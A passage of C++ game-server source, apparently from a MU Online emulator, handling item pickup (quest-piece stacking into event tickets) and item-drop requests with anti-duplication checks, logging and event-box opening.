								g_kJewelOfHarmonySystem.GetItemStrengthenOption((lpItem)?((CItem *)&lpItem->m_Number):NULL), g_kJewelOfHarmonySystem.GetItemOptionLevel((lpItem)?((CItem *)&lpItem->m_Number):NULL));

							pResult.result = -3;

							DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);			

							gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;

							if ( gObj[aIndex].pInventory[pos].m_Durability >= 5.0f )
							{
								int NewDur = gObj[aIndex].pInventory[pos].m_Durability - 5.0f;
								::gObjInventoryItemSet(aIndex, pos, -1);
								gObj[aIndex].pInventory[pos].Clear();
								::GCInventoryItemDeleteSend(aIndex, pos, 1);
								::ItemSerialCreateSend(aIndex, 235, gObj[aIndex].X, gObj[aIndex].Y, ItemGetNumberMake(14,111),
									lpItem->m_Level, 0, 0, 0, 0, aIndex, 0, 0);

								LogAddTD("[DoubleGoer] [%s][%s] Make DoubleGoer Ticket (Left Pieces:%d)",
									gObj[aIndex].AccountID, gObj[aIndex].Name, NewDur);

								if ( NewDur > 0 )
								{
									lpItem->m_State = 2;
									lpItem->Give = false;
									lpItem->live = true;
									lpItem->m_Durability = NewDur;

									continue;
								}
							}
							else
							{
								GCItemDurSend(aIndex,pos, gObj[aIndex].pInventory[pos].m_Durability, 0);
							}
							return;
						}
					}
					else
					{
						break;
					}
				}
			}
			
			if ( lpItem->m_Type == ITEMGET(14,101) ) // Paper Piece = Imperial ticket
			{
				for ( int n=0;n<ReadConfig.MAIN_INVENTORY_SIZE(aIndex,false);n++)
				{
					int pos = ::g_ImperialGuardian.CheckOverlapPaperMark(aIndex);

					if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) )
					{
						if ( MapC[map_num].ItemGive(aIndex, item_num, true) == TRUE )
						{
							BYTE NewOption[MAX_EXOPTION_SIZE];

							::ItemIsBufExOption(NewOption, (lpItem != NULL)?(CItem*)&lpItem->m_Number:NULL);

							PLAYER_ITEMS_LOG.Output(lMsg.Get(MSGGET(1, 221)), gObj[aIndex].AccountID, gObj[aIndex].Name, map_num,
								gObj[aIndex].X, gObj[aIndex].Y, lpItem->m_Number, szItemName, type,
								level, lpItem->m_SkillOption, lpItem->m_LuckOption, lpItem->m_Z28Option, (int)lpItem->m_Durability,
								NewOption[0], NewOption[1], NewOption[2], NewOption[3], NewOption[4], NewOption[5],
								NewOption[6], lpItem->m_SetOption, lpItem->m_ItemOptionEx>>7,
								g_kJewelOfHarmonySystem.GetItemStrengthenOption((lpItem)?((CItem *)&lpItem->m_Number):NULL), g_kJewelOfHarmonySystem.GetItemOptionLevel((lpItem)?((CItem *)&lpItem->m_Number):NULL));

							pResult.result = -3;

							DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);			

							gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;

							if ( gObj[aIndex].pInventory[pos].m_Durability >= 5.0f )
							{
								int NewDur = gObj[aIndex].pInventory[pos].m_Durability - 5.0f;
								::gObjInventoryItemSet(aIndex, pos, -1);
								gObj[aIndex].pInventory[pos].Clear();
								::GCInventoryItemDeleteSend(aIndex, pos, 1);
								::ItemSerialCreateSend(aIndex, 235, gObj[aIndex].X, gObj[aIndex].Y, ItemGetNumberMake(14,102),
									lpItem->m_Level, 0, 0, 0, 0, aIndex, 0, 0);

								LogAddTD("[Imperial Guardian] [%s][%s] Make Imperial Ticket (Left Paper Pieces:%d)",
									gObj[aIndex].AccountID, gObj[aIndex].Name, NewDur);

								if ( NewDur > 0 )
								{
									lpItem->m_State = 2;
									lpItem->Give = false;
									lpItem->live = true;
									lpItem->m_Durability = NewDur;

									continue;
								}
							}
							else
							{
								GCItemDurSend(aIndex,pos, gObj[aIndex].pInventory[pos].m_Durability, 0);
							}
							return;
						}
					}
					else
					{
						break;
					}
				}
			}

			/*if ( lpItem->m_Type == ITEMGET(14,100) ) //Lucky Peny
			{
				for ( int n=0;n<ReadConfig.MAIN_INVENTORY_SIZE(aIndex,false);;n++)
				{
					!!!!!!!!!! int pos = ::g_LuckyPenyEvent.CheckOverlapCsMarks(aIndex);

					if ( MAIN_INVENTORY_RANGE(pos) )
					{
						int Dur = gObj[aIndex].pInventory[pos].m_Durability + lpItem->m_Durability;

						if ( Dur <= 255 )
						{
							if ( MapC[map_num].ItemGive(aIndex, item_num, true) == TRUE )
							{
								pResult.result = -3;
								DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
								gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;
								GCItemDurSend( aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability,0);
								return;
							}
						}
						else
						{
							lpItem->m_Durability = Dur - 255;
							gObj[aIndex].pInventory[pos].m_Durability = 255.0f;
							GCItemDurSend(aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 0);
						}
					}
					else
					{
						break;
					}
				}
			}*/

			if ( lpItem->m_Type == ITEMGET(14,29) ) // Symbol of Kundun
			{
				for ( int n=0;n<ReadConfig.MAIN_INVENTORY_SIZE(aIndex,false);n++)
				{
					int pos = ::g_KalimaGate.CheckOverlapKundunMark(aIndex, lpItem->m_Level);

					if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) )
					{
						if ( MapC[map_num].ItemGive(aIndex, item_num, true) == TRUE )
						{
							BYTE NewOption[MAX_EXOPTION_SIZE];

							::ItemIsBufExOption(NewOption, (lpItem != NULL)?(CItem*)&lpItem->m_Number:NULL);

							PLAYER_ITEMS_LOG.Output(lMsg.Get(MSGGET(1, 221)), gObj[aIndex].AccountID, gObj[aIndex].Name, map_num,
								gObj[aIndex].X, gObj[aIndex].Y, lpItem->m_Number, szItemName, type,
								level, lpItem->m_SkillOption, lpItem->m_LuckOption, lpItem->m_Z28Option, (int)lpItem->m_Durability,
								NewOption[0], NewOption[1], NewOption[2], NewOption[3], NewOption[4], NewOption[5],
								NewOption[6], lpItem->m_SetOption, lpItem->m_ItemOptionEx>>7,
								g_kJewelOfHarmonySystem.GetItemStrengthenOption((lpItem)?((CItem *)&lpItem->m_Number):NULL), g_kJewelOfHarmonySystem.GetItemOptionLevel((lpItem)?((CItem *)&lpItem->m_Number):NULL));

							pResult.result = -3;

							DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);			

							gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;

							if ( gObj[aIndex].pInventory[pos].m_Durability >= 5.0f )
							{
								int NewDur = gObj[aIndex].pInventory[pos].m_Durability - 5.0f;
								::gObjInventoryItemSet(aIndex, pos, -1);
								gObj[aIndex].pInventory[pos].Clear();
								::GCInventoryItemDeleteSend(aIndex, pos, 1);
								::ItemSerialCreateSend(aIndex, 235, gObj[aIndex].X, gObj[aIndex].Y, ItemGetNumberMake(14,28),
									lpItem->m_Level, 0, 0, 0, 0, aIndex, 0, 0);

								LogAddTD("[Kalima] [%s][%s] Make Lost Kalima Map (Left Kundun Mark:%d)",
									gObj[aIndex].AccountID, gObj[aIndex].Name, NewDur);

								if ( NewDur > 0 )
								{
									lpItem->m_State = 2;
									lpItem->Give = false;
									lpItem->live = true;
									lpItem->m_Durability = NewDur;

									continue;
								}
							}
							else
							{
								GCItemDurSend(aIndex,pos, gObj[aIndex].pInventory[pos].m_Durability, 0);
							}
							return;
						}
					}
					else
					{
						break;
					}
				}
			}

			if ( lpItem->m_Type == ITEMGET(14,21) && lpItem->m_Level == 3) // Sign of Lord
			{
				for ( int n=0;n<ReadConfig.MAIN_INVENTORY_SIZE(aIndex,false);n++)
				{
					int pos = ::g_CastleSiegeSync.CheckOverlapCsMarks(aIndex);

					if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) )
					{
						int Dur = gObj[aIndex].pInventory[pos].m_Durability + lpItem->m_Durability;

						if ( Dur <= 255 )
						{
							if ( MapC[map_num].ItemGive(aIndex, item_num, true) == TRUE )
							{
								pResult.result = -3;
								DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
								gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;
								GCItemDurSend( aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability,0);
								return;
							}
						}
						else
						{
							lpItem->m_Durability = Dur - 255;
							gObj[aIndex].pInventory[pos].m_Durability = 255.0f;
							GCItemDurSend(aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 0);
						}
					}
					else
					{
						break;
					}
				}
			}

			pResult.result = ::gObjInventoryInsertItemTemp(&gObj[aIndex], lpItem);
			
			if ( pResult.result != 0xFF )
			{
				ItemByteConvert((LPBYTE)&pResult.Data[0], lpItem->m_Type, lpItem->m_SkillOption, lpItem->m_LuckOption,
					lpItem->m_Z28Option, lpItem->m_Level, lpItem->m_Durability, lpItem->m_NewOption,
					lpItem->m_SetOption, lpItem->m_JewelOfHarmonyOption, lpItem->m_ItemOptionEx,lpItem->m_ItemSlot1-1,lpItem->m_ItemSlot2-1,lpItem->m_ItemSlot3-1,lpItem->m_ItemSlot4-1,lpItem->m_ItemSlot5-1);

				if ( MapC[map_num].ItemGive(aIndex, item_num, false) == TRUE )
				{
					BYTE pos = ::gObjInventoryInsertItem(aIndex, lpItem);

					if ( pos == 0xFF )
						pResult.result = -1;

					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					if ( pos == 0xFF )
					{
						::GCItemListSend(aIndex);
					}
					else
					{
						BYTE NewOption[MAX_EXOPTION_SIZE];

						::ItemIsBufExOption(NewOption, (lpItem != NULL)?(CItem*)&lpItem->m_Number:NULL);

						PLAYER_ITEMS_LOG.Output(lMsg.Get(MSGGET(1, 221)), gObj[aIndex].AccountID, gObj[aIndex].Name, map_num,
							gObj[aIndex].X, gObj[aIndex].Y, lpItem->m_Number, szItemName, type,
							level, lpItem->m_SkillOption, lpItem->m_LuckOption, lpItem->m_Z28Option, (INT)lpItem->m_Durability,
							NewOption[0], NewOption[1], NewOption[2], NewOption[3], NewOption[4], NewOption[5],
							NewOption[6], lpItem->m_SetOption, lpItem->m_ItemOptionEx>>7,
							g_kJewelOfHarmonySystem.GetItemStrengthenOption((lpItem)?((CItem *)&lpItem->m_Number):NULL), g_kJewelOfHarmonySystem.GetItemOptionLevel((lpItem)?((CItem *)&lpItem->m_Number):NULL));
						::GCSendGetItemInfoForParty(aIndex, lpItem);

						if ( BC_MAP_RANGE(map_num) )
						{
							int BCRest = MAP_INDEX_BLOODCASTLE1;
							if(map_num == 52)
							{
								BCRest = 45;
							}
							if ( g_BloodCastle.CheckQuestItemSerial(map_num-BCRest, lpItem) )
							{
								g_BloodCastle.m_BridgeData[map_num-BCRest].m_iBC_QUEST_ITEM_USER_INDEX = gObj[aIndex].m_Index;
								char szTempMsg[128];

								switch ( lpItem->m_Level )
								{
									case 0:	// Staff of Archangel
										wsprintf(szTempMsg, lMsg.Get(MSGGET(4, 150)), gObj[aIndex].Name);
										g_BloodCastle.SendNoticeMessage(gObj[aIndex].MapNumber-BCRest, szTempMsg);
										break;

									case 1:	// Sword of Archangel
										wsprintf(szTempMsg, lMsg.Get(MSGGET(4, 151)), gObj[aIndex].Name);
										g_BloodCastle.SendNoticeMessage(gObj[aIndex].MapNumber-BCRest, szTempMsg);
										break;

									case 2:	// Crossbow of Archangel
										wsprintf(szTempMsg, lMsg.Get(MSGGET(4, 152)), gObj[aIndex].Name);
										g_BloodCastle.SendNoticeMessage(gObj[aIndex].MapNumber-BCRest, szTempMsg);
										break;

									default:
										szTempMsg[0] = 0;
								}

								LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) picked up Angel King's Weapon (%d)",
									map_num-BCRest+1, gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->m_Level);
							}
						}
					}
				}
				else
				{
					pResult.result = -1;
					pResult.h.size -= sizeof(pResult.Data);

					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				}
			}
			else
			{
				pResult.result = -1;
				pResult.h.size -= sizeof(pResult.Data);

				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			}
		}
	}
	else
	{
		pResult.h.size -= sizeof(pResult.Data);
		DataSend(aIndex, (UCHAR*)&pResult, pResult.h.size);
	}
}



BOOL CGItemDropRequest(PMSG_ITEMTHROW * lpMsg, int aIndex, BOOL drop_type, BYTE exception)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return FALSE;
	}

	BOOL CopyItem = FALSE;
	BYTE NewOption[MAX_EXOPTION_SIZE];

	if ( !PacketCheckTime(&gObj[aIndex]))
		return FALSE;

	PMSG_ITEMTHROW_RESULT pResult;

	PHeadSetB((LPBYTE)&pResult, 0x23, sizeof(pResult));
	pResult.Result = true;
	pResult.Ipos = lpMsg->Ipos;

	if ( gObj[aIndex].m_IfState.use != 0 )
	{
		if ( gObj[aIndex].m_IfState.type != 3 )
		{
			pResult.Result = false;
			return FALSE;
		}
	}

	if ( gObj[aIndex].CloseType != -1 )
		pResult.Result = false;

	if ( gObj[aIndex].m_bMapSvrMoveQuit == true || gObj[aIndex].m_bMapAntiHackMove == true )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][Item Duplication] - Item Drop during MapServer Move [%s][%s]",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
		pResult.Result = false;
	}

	if ( !::gObjFixInventoryPointer(aIndex))
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);

	if ( gObj[aIndex].pTransaction == 1 )
	{
		LogAddTD("[%s][%s] CGItemDropRequest() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_IfState.type);
		pResult.Result = false;
		
		return false;
	}

	LPOBJ lpObj = &gObj[aIndex];

	if ( lpMsg->Ipos == 0xFF )	// Null Position
	{
		LogAdd("error:%s %d", __FILE__, __LINE__);
		pResult.Result = false;
	}

	if ( lpMsg->Ipos < 0 || lpMsg->Ipos > ReadConfig.MAIN_INVENTORY_SIZE(aIndex,false)-1)	// Out of Bounds
		pResult.Result = false;

	if (!::gObjCanItemTouch(lpObj, 0))
	{
		LogAdd("[ItemDrop] gObjCanItemTouch - %s, %d", __FILE__, __LINE__);
		pResult.Result = false;
	}

	if(MuItemShop.IsCShopItem(aIndex,lpMsg->Ipos) == true)
	{
		GCServerMsgStringSend("Can not drop this item", lpObj->m_Index, 1);
		pResult.Result = false;
	}

	// Icarus Preventions about Dinorant
	if ( gObj[aIndex].MapNumber == MAP_INDEX_ICARUS)
	{
		if ( lpMsg->Ipos == 8 )
		{
			if ( lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(13,3) ) // Dinorant
			{
				if( lpObj->pInventory[7].IsItem() == FALSE )
				{
					pResult.Result = false;
				}
			}
		}
		else if ( lpMsg->Ipos == 7 )
		{
			if ( lpObj->pInventory[8].m_Type != ITEMGET(13,3) ) // Dinorant 
			{
				pResult.Result = false;
			}
		}
	}

	if ( lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(12,30) ||
		 lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(12,31) ||
		 lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(13,36) ||
		 lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(13,37) ||
		 lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(13,80) ||
		 lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(13,123) ||
		 lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(13,67) //rudolf
		 )
	{
		LogAdd("[ItemDrop] Trying to drop Pet - %s, %d", __FILE__, __LINE__);
		pResult.Result = false;
	}

	if(lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(13,20) && lpObj->pInventory[lpMsg->Ipos].m_Level == 0)
	{
		pResult.Result = false;
	}

	if(lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(13,107))
	{
		pResult.Result = false;
	}

	//if ( (lpObj->pInventory[lpMsg->Ipos].m_Type >= ITEMGET(13,0) && lpObj->pInventory[lpMsg->Ipos].m_Type <= ITEMGET(13,3))
	//	||  lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(14,13) ||
	//	lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(14,14) ||
	//	lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(14,16) ||
	//	(lpObj->pInventory[lpMsg->Ipos].m_Type >= ITEMGET(12,0)
	//	&& lpObj->pInventory[lpMsg->Ipos].m_Type <= ITEMGET(12,6)) 	||
	//	(lpObj->pInventory[lpMsg->Ipos].m_Type >= ITEMGET(12,36)
	//	&& lpObj->pInventory[lpMsg->Ipos].m_Type <= ITEMGET(12,40)) 
	//	|| lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(12,15) 
	//	|| (lpObj->pInventory[lpMsg->Ipos].m_Level > 4 
	//	&& lpObj->pInventory[lpMsg->Ipos].m_Type < ITEMGET(12,0)) 
	//	||  lpObj->pInventory[lpMsg->Ipos].IsSetItem() != FALSE 
	//	||  lpObj->pInventory[lpMsg->Ipos].IsExtItem() != FALSE )
	//{
	//	if ( PvP.gPkLimitFree == FALSE )
	//	{
	//		pResult.Result = false;
	//	}
	//}

	if ( g_kJewelOfHarmonySystem.IsStrengthenByJewelOfHarmony(&lpObj->pInventory[lpMsg->Ipos]) == TRUE )
	{
		LogAdd("[ItemDrop] Trying to drop JewelOfHarmony reinforced item - %s, %d", __FILE__, __LINE__);
		pResult.Result = false;
		GCServerMsgStringSend(lMsg.Get(MSGGET(13, 43)), lpObj->m_Index, 1);
	}

	if ( g_kJewelOfHarmonySystem.IsJewelOfHarmonyOriginal(lpObj->pInventory[lpMsg->Ipos].m_Type) ||
		 g_kJewelOfHarmonySystem.IsJewelOfHarmonyPurity(lpObj->pInventory[lpMsg->Ipos].m_Type)   ||
		 g_kJewelOfHarmonySystem.IsJewelOfHarmonySmeltingItems(lpObj->pInventory[lpMsg->Ipos].m_Type) )
	{
		LogAdd("[ItemDrop] Trying to drop JewelOfHarmony item - %s, %d", __FILE__, __LINE__);
		pResult.Result = false;
	}

	if ( lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(13,39) )
	{
		pResult.Result = false;
	}

	if ( lpObj->pInventory[lpMsg->Ipos].m_Type == ITEMGET(14,64) && exception == 0)	//Prevent Illusion Temple fireball disposal
	{
		pResult.Result = false;
		GCServerMsgStringSend("Can not drop this item", lpObj->m_Index, 1);
	}

#if (CRYSTAL_EDITION==1)
	if(CJewel.IsJewel(lpObj->pInventory[lpMsg->Ipos].m_Type) != -1 )
	{
		pResult.Result = false;
		GCServerMsgStringSend("Can not drop this item", lpObj->m_Index, 1);
	}
	
	if(lpObj->pInventory[lpMsg->Ipos].m_Type >= ITEMGET(12,200) && lpObj->pInventory[lpMsg->Ipos].m_Type <= ITEMGET(12,254))
	{
		pResult.Result = false;
		GCServerMsgStringSend("Can not drop this item", lpObj->m_Index, 1);
	}
#endif

	if ( IsCashItem(lpObj->pInventory[lpMsg->Ipos].m_Type) == TRUE )
	{
		LogAdd("[ItemDrop] Trying to drop cash item - %s, %d", __FILE__, __LINE__);
		pResult.Result = false;
	}

	if ( pResult.Result == 1 )
	{
		::ItemIsBufExOption(NewOption, &lpObj->pInventory[lpMsg->Ipos]);

		int map = lpObj->MapNumber;
		int type = lpObj->pInventory[lpMsg->Ipos].m_Type;
		int level = lpObj->pInventory[lpMsg->Ipos].m_Level;
		float dur = lpObj->pInventory[lpMsg->Ipos].m_Durability;
		BOOL bIsItem = lpObj->pInventory[lpMsg->Ipos].IsItem();
		BYTE Option1 = lpObj->pInventory[lpMsg->Ipos].m_SkillOption;
		BYTE Option2 = lpObj->pInventory[lpMsg->Ipos].m_LuckOption;
		BYTE Option3 = lpObj->pInventory[lpMsg->Ipos].m_Z28Option;
		BYTE NOption = lpObj->pInventory[lpMsg->Ipos].m_NewOption;
		DWORD serial = lpObj->pInventory[lpMsg->Ipos].m_Number;
		int PetLevel = lpObj->pInventory[lpMsg->Ipos].m_PetItem_Level;
		int PetExp = lpObj->pInventory[lpMsg->Ipos].m_PetItem_Exp;
		BYTE SOption = lpObj->pInventory[lpMsg->Ipos].m_SetOption;
		BYTE btItemEffectEx = lpObj->pInventory[lpMsg->Ipos].m_ItemOptionEx;
		int serial2 = lpObj->pInventory[lpMsg->Ipos].m_Number;
		char szItemName[50] = "Item";
		BYTE JOHOption = g_kJewelOfHarmonySystem.GetItemStrengthenOption(&lpObj->pInventory[lpMsg->Ipos]);
		BYTE JOHOptionLevel = g_kJewelOfHarmonySystem.GetItemOptionLevel(&lpObj->pInventory[lpMsg->Ipos]);
		
		BYTE ItemSlot1 = lpObj->pInventory[lpMsg->Ipos].m_ItemSlot1;
		BYTE ItemSlot2 = lpObj->pInventory[lpMsg->Ipos].m_ItemSlot2;
		BYTE ItemSlot3 = lpObj->pInventory[lpMsg->Ipos].m_ItemSlot3;
		BYTE ItemSlot4 = lpObj->pInventory[lpMsg->Ipos].m_ItemSlot4;
		BYTE ItemSlot5 = lpObj->pInventory[lpMsg->Ipos].m_ItemSlot5;

		if ( gObjCheckSerial0ItemList(&lpObj->pInventory[lpMsg->Ipos]) != FALSE )
		{
			MsgOutput(lpObj->m_Index, lMsg.Get(MSGGET(13, 26)));
			if(ReadConfig.AHLog == TRUE)
			{
				ANTI_HACK_LOG.Output("[ANTI-HACK][Serial 0 Item] [ItemDrop] (%s)(%s) Item(%s) Pos(%d)",
					lpObj->AccountID, lpObj->Name, lpObj->pInventory[lpMsg->Ipos].GetName(),
					lpMsg->Ipos);
			}

			CopyItem = TRUE;
			pResult.Result = false;
			bIsItem = FALSE;
		}

		
		if ( !::gObjInventorySearchSerialNumber(lpObj, serial2))	// ANTI DUPE SYSTEM
		{
			CopyItem = TRUE;
			pResult.Result = false;
			bIsItem = FALSE;
		}

		if ( bIsItem == TRUE )
		{
			strcpy(szItemName, lpObj->pInventory[lpMsg->Ipos].GetName());

			if ( (type >= ITEMGET(13,43) && type <= ITEMGET(13,45)) ||
				 (type == ITEMGET(13,59)) ||
			 	 (type >= ITEMGET(13,62) && type <= ITEMGET(13,63)) ||
				 (type >= ITEMGET(13,93) && type <= ITEMGET(13,94)) ||
				 (type == ITEMGET(13,96)) ||
				 (type >= ITEMGET(13,103) && type <= ITEMGET(13,105)) ||
				 (type == ITEMGET(13,116))
				) //Symbol Effects
			{
				if ((type >= ITEMGET(13,43) && type <= ITEMGET(13,45)) ||
					type == ITEMGET(13,62)
					)
				{
					if (gObjIsNewClass(lpObj) == 1)
					{
						pResult.Result = false;
						DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

						GCServerMsgStringSend("Master cant use this item!",lpObj->m_Index , 0x01);
	
						return FALSE;
					}
				}
				if ((type >= ITEMGET(13,93) && type <= ITEMGET(13,94)) || type == ITEMGET(13,96))
				{
					if (gObjIsNewClass(lpObj) == 0)
					{
						pResult.Result = false;
						DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

						GCServerMsgStringSend("This Item is for masters only!",lpObj->m_Index , 0x01);
	
						return FALSE;
					}
				}

				int Secs = MuItemShop.UseBuffGetTime(aIndex,lpMsg->Ipos);
				pResult.Result = true;
				::gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				g_ItemAddOption.SetItemEffect(lpObj, type, Secs);
			}
			else if ( type == ITEMGET(14,141))
			{
				if(level <= 10)
				{
					int mon = 250000 + (50000 * level); 
					::Eledorado2BoxOpenEven(&gObj[aIndex], level, 0, mon);
					LogAddTD("[%s][%s][%d]%d/%d Used Winning Jewelry Box %d Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,level,
						serial, szItemName, type, level, Option1, Option2, Option3);
					::gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				}
			}

			else if ( type == ITEMGET(14,11)) // Box of Luck until Kunduns
			{
				::gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				pResult.Result = true;

				if ( level == 1 )
				{
					StarOfXMasItemBag->DropStarOfXMasEventItem(aIndex);
				}
				else if ( level == 2 )
				{
					::FireCrackerOpenEven(&gObj[aIndex]);
					LogAddTD("[%s][%s][%d]%d/%d Used box of FireCracker Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 3 )
				{
					::HeartOfLoveOpenEven(&gObj[aIndex]);
					LogAddTD("[%s][%s][%d]%d/%d Used box of HeartOfLove Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 6 )
				{
					::GoldMedalOpenEven(&gObj[aIndex]);
					LogAddTD("[%s][%s][%d]%d/%d Used box of GoldMedal Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 5 )
				{
					::SilverMedalOpenEven(&gObj[aIndex]);
					LogAddTD("[%s][%s][%d]%d/%d Used box of SilverMedal Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 7 )
				{
					::EventChipOpenEven(&gObj[aIndex]);
					LogAddTD("[%s][%s][%d]%d/%d Used box of EventChip Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 8 )
				{
					::EledoradoBoxOpenEven(&gObj[aIndex], level, 2, 50000);
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox-8 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 9 )
				{
					::EledoradoBoxOpenEven(&gObj[aIndex], level, 2, 100000);
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox-9 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 10 )
				{
					::EledoradoBoxOpenEven(&gObj[aIndex], level, 2, 150000);
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox-10 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 11 )
				{
					::EledoradoBoxOpenEven(&gObj[aIndex], level, 1, 200000);
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox1-11 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 12 )
				{
					::EledoradoBoxOpenEven(&gObj[aIndex], level, 0, 250000);
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox1-12 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 13 )
				{
					::DarkLordHeartItemBoxOpen(&gObj[aIndex]);
					LogAddTD("[%s][%s][%d]%d/%d Used box of DarkLordHeart Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else if ( level == 0 )
				{
					::LuckyBoxOpenEven(&gObj[aIndex]);
					ITEMBAG_DROP_LOG.Output(lMsg.Get(MSGGET(1, 222)),	// [%s][%s][%d]%d/%d Used Box of Luck Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)
						lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
						serial, szItemName, type, level, Option1, Option2, Option3);
				}
				else
				{
					pResult.Result = false;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					return FALSE;
				}

				LogAddTD("[%s][%s] Used box of luck (level:%d)",
					lpObj->AccountID, lpObj->Name, level);
			}
			else if ( type == ITEMGET(12,32) )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				RedRibbonBoxOpen(&gObj[aIndex]);
				LogAddTD("[%s][%s][%d]%d/%d Used Christmas RibbonBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(12,33) )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				GreenRibbonBoxOpen(&gObj[aIndex]);
